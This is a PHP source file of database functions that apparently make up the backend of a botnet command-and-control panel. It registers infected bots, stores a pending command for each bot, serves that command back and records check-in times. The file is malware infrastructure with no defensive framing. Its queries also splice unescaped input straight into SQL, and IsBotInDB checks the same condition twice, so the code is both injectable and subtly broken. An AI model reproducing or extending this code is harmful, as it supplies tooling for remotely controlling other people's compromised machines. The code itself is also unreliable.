<?php

function SetBotCommand($sql,$command){
$a="UPDATE bots SET Command='".$command."  "."' WHERE ".$sql;
$b00l=mysql_query($a) or die('SetbotCommad:'.mysql_error());
 return $b00l;}

function IsBotInDB($serial,$name){  
       $sql="SELECT ID FROM bots WHERE Serial='$serial' AND name='$name'";  
  
       $query=mysql_query($sql) or die("wrong query");
       $row=mysql_fetch_array($query,MYSQL_ASSOC);
       if ($row['ID']=='')
         {
          return 1;}
       elseif($row['ID']=='') 
         {
           return 0;
         }
}

function GetBotID($serial,$name){       
       $sql="SELECT ID FROM bots WHERE Serial='$serial' AND name='$name'";  
       $query=mysql_query($sql) or die("wrong query");
       $row=mysql_fetch_array($query,MYSQL_ASSOC);
       return $row['ID'];       
}

function GetBotCmd($ID){
       $sql="SELECT Command FROM bots WHERE ID='$ID'";  
       $query=mysql_query($sql) or die("wrong query");
       $row=mysql_fetch_array($query,MYSQL_ASSOC);
       if($row['Command']==''){
         return "wait  ";}
       return $row['Command'];
       
        
}

function AddBotToDB($serial,$name){//country 
//current date     
  $date1=date(d);
        $date2=date(m);
         $date3=date(y);
//login time
$second=microtime();
$timestamp=explode(" ",$second);
       $sql="INSERT INTO bots (ID,Serial,name,Command,Date,Login)
                      VALUES(NULL,'$serial','$name','wait','$date1.$date2.$date3','$timestamp[1]');";
					  //echo $country_code;
      $query=mysql_query($sql) or die("ADDBOTTODB:". mysql_error());
}

function SetLoginDate($id){
$second=microtime();
$timestamp=explode(" ",$second);
$sql="UPDATE bots Set Login=$timestamp[1] WHERE ID='$id'";
$query=mysql_query($sql) or die("SetLoginDate:". mysql_error());
}
?>